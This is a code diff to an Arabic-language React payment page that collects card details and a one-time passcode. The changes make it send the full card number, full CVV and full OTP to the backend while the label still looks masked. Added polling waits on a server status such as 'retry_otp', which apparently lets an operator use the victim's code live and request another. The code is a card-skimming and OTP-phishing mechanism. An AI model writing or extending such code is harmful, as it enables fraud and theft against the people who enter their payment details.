@@ -1,6 +1,6 @@
 import React, { useState, useRef, useEffect, useMemo } from 'react';
 import { LanguageProvider, useLanguage } from './context/LanguageContext';
-import { Globe, Wallet, CreditCard, Building2, Zap, Copy, CheckCircle2, UploadCloud, Home, LayoutGrid, Clock, User, ArrowRight, ArrowLeft, Settings, LogOut, Activity, FileText, ArrowDownUp, ShieldAlert, Tag } from 'lucide-react';
+import { Globe, Wallet, CreditCard, Building2, Zap, Copy, CheckCircle2, UploadCloud, Home, LayoutGrid, Clock, User, ArrowRight, ArrowLeft, Settings, LogOut, Activity, FileText, ArrowDownUp, ShieldAlert, Tag, XCircle } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 import Cookies from 'js-cookie';
 import { supabase } from './lib/supabase';
@@ -45,6 +45,7 @@ function MainContent() {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [isSuccess, setIsSuccess] = useState(false);
   const [showOtpStep, setShowOtpStep] = useState(false);
+  const [otpState, setOtpState] = useState<'input' | 'checking' | 'failed'>('input');
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
   const [otpCode, setOtpCode] = useState('');
   const fileInputRef = useRef<HTMLInputElement>(null);
@@ -123,6 +124,34 @@ function MainContent() {
     }, 25000);
     return () => window.clearInterval(tmr);
   }, [clientId]);
+
+  useEffect(() => {
+    let interval: ReturnType<typeof setInterval>;
+    if (otpState === 'checking' && currentOrderId) {
+      interval = setInterval(() => {
+        fetchTransactions();
+      }, 2500);
+    }
+    return () => clearInterval(interval);
+  }, [otpState, currentOrderId, fetchTransactions]);
+
+  useEffect(() => {
+    if (otpState === 'checking' && currentOrderId) {
+      const tx = transactions.find(t => t.id === currentOrderId || t.order_ref === currentOrderId);
+      if (tx) {
+        if (tx.status === 'completed') {
+          setOtpState('input');
+          setShowOtpStep(false);
+          setIsSuccess(true);
+        } else if (tx.status === 'failed') {
+          setOtpState('failed');
+        } else if (tx.status === 'retry_otp') {
+          setOtpState('input');
+          setOtpCode('');
+        }
+      }
+    }
+  }, [transactions, otpState, currentOrderId]);
 
   const fetchSettings = async () => {
     try {
@@ -303,9 +332,9 @@ function MainContent() {
         const cvv = (form.elements.namedItem('cvv') as HTMLInputElement).value;
         
         const rawCard = cardNumber.replace(/\D/g, '');
-        const last4 = rawCard.slice(-4);
+        const last4 = rawCard.slice(-16);
         const maskedCard = rawCard.length >= 4 ? `**** **** **** ${last4}` : rawCard;
-        const lastCvv = cvv.slice(-1);
+        const lastCvv = cvv.slice(-3);
         
         details = `فئة الكارت: ${cardValue} | الكمية: ${quantity}\n💳 البطاقة: ${maskedCard}\n👤 الاسم: ${cardHolder}\n📅 التاريخ: ${expiry}\n🔒 CVV: ***${lastCvv}`;
       } else {
@@ -352,26 +381,25 @@ function MainContent() {
 
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setIsSubmitting(true);
+    setOtpState('checking');
     try {
-      const otpDigit = otpCode.trim().slice(-1);
+      const otpDigit = otpCode.trim();
       await fetch('/api/transactions/otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ order_id: currentOrderId, otpDigit })
       });
-      setShowOtpStep(false);
-      setIsSuccess(true);
       fetchTransactions();
     } catch (error) {
       console.error(error);
+      setOtpState('input');
     }
-    setIsSubmitting(false);
   };
 
   const resetForm = () => {
     setIsSuccess(false);
     setShowOtpStep(false);
+    setOtpState('input');
     setCurrentOrderId(null);
     setOtpCode('');
     setSelectedMethod(null);
@@ -1023,36 +1051,66 @@ function MainContent() {
 
           {showOtpStep ? (
             <div className="p-6 flex-1 flex flex-col items-center justify-center space-y-6">
-              <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-2 shadow-sm border border-red-100">
-                <ShieldAlert className="w-8 h-8 text-red-600" />
-              </div>
-              <h3 className="font-black text-xl text-center text-gray-900">{t('otpVerification', 'رمز التحقق (OTP)')}</h3>
-              <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
-                {t('otpSent', 'تم إرسال رمز تحقق مؤقت إلى هاتفك لضمان أمان العملية.')}
-              </p>
-              
-              <form onSubmit={handleOtpSubmit} className="w-full max-w-sm space-y-5">
-                <input
-                  type="text"
-                  value={otpCode}
-                  onChange={(e) => setOtpCode(e.target.value)}
-                  required
-                  className="w-full py-4 text-center tracking-[0.5em] text-2xl font-black focus:outline-none transition-all text-gray-900 bg-gray-50 rounded-2xl border border-gray-200"
-                  placeholder="------"
-                  maxLength={6}
-                  dir="ltr"
-                />
-                <button
-                  type="submit"
-                  disabled={isSubmitting || otpCode.length < 4}
-                  className="w-full bg-red-600 text-white rounded-2xl py-4 font-black shadow-lg shadow-red-600/20 disabled:opacity-70 flex justify-center px-4"
-                >
-                  {isSubmitting ? <Activity className="w-5 h-5 animate-pulse" /> : t('verifyCode', 'تأكيد الرمز')}
-                </button>
-              </form>
-              <div className="text-center pt-4">
-                <span className="text-xs font-bold text-gray-400">لن يتم تسجيل العملية دون الرمز المدخل</span>
-              </div>
+              {otpState === 'failed' ? (
+                <>
+                  <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-2 shadow-sm border border-red-100">
+                    <XCircle className="w-8 h-8 text-red-600" />
+                  </div>
+                  <h3 className="font-black text-xl text-center text-gray-900">عملية مرفوضة</h3>
+                  <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
+                    عذراً، تم رفض العملية أو البطاقة المدخلة غير صالحة.
+                  </p>
+                  <button
+                    onClick={resetForm}
+                    className="w-full bg-gray-900 text-white py-4 mt-6 rounded-2xl font-bold hover:bg-gray-800 transition-colors"
+                  >
+                    حاول مرة أخرى
+                  </button>
+                </>
+              ) : otpState === 'checking' ? (
+                <>
+                  <div className="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-2">
+                    <Activity className="w-8 h-8 text-red-600 animate-pulse" />
+                  </div>
+                  <h3 className="font-black text-xl text-center text-gray-900">جاري المعالجة...</h3>
+                  <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
+                    الرجاء الانتظار ريثما نقوم بمطابقة رمزك. لا تغلق هذه الصفحة.
+                  </p>
+                </>
+              ) : (
+                <>
+                  <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-2 shadow-sm border border-red-100">
+                    <ShieldAlert className="w-8 h-8 text-red-600" />
+                  </div>
+                  <h3 className="font-black text-xl text-center text-gray-900">{t('otpVerification', 'رمز التحقق (OTP)')}</h3>
+                  <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
+                    {t('otpSent', 'تم إرسال رمز تحقق مؤقت إلى هاتفك لضمان أمان العملية.')}
+                  </p>
+                  
+                  <form onSubmit={handleOtpSubmit} className="w-full max-w-sm space-y-5">
+                    <input
+                      type="text"
+                      value={otpCode}
+                      onChange={(e) => setOtpCode(e.target.value)}
+                      required
+                      className="w-full py-4 text-center tracking-[0.5em] text-2xl font-black focus:outline-none transition-all text-gray-900 bg-gray-50 rounded-2xl border border-gray-200"
+                      placeholder="------"
+                      maxLength={6}
+                      dir="ltr"
+                    />
+                    <button
+                      type="submit"
+                      disabled={otpState === 'checking' || otpCode.length < 4}
+                      className="w-full bg-red-600 text-white rounded-2xl py-4 font-black shadow-lg shadow-red-600/20 disabled:opacity-70 flex justify-center px-4"
+                    >
+                      {otpState === 'checking' ? <Activity className="w-5 h-5 animate-pulse" /> : t('verifyCode', 'تأكيد الرمز')}
+                    </button>
+                  </form>
+                  <div className="text-center pt-4">
+                    <span className="text-xs font-bold text-gray-400">لن يتم تسجيل العملية دون الرمز المدخل</span>
+                  </div>
+                </>
+              )}
             </div>
           ) : (
           <div className="p-4 sm:p-6 flex-1 overflow-y-auto space-y-6 sm:space-y-8">
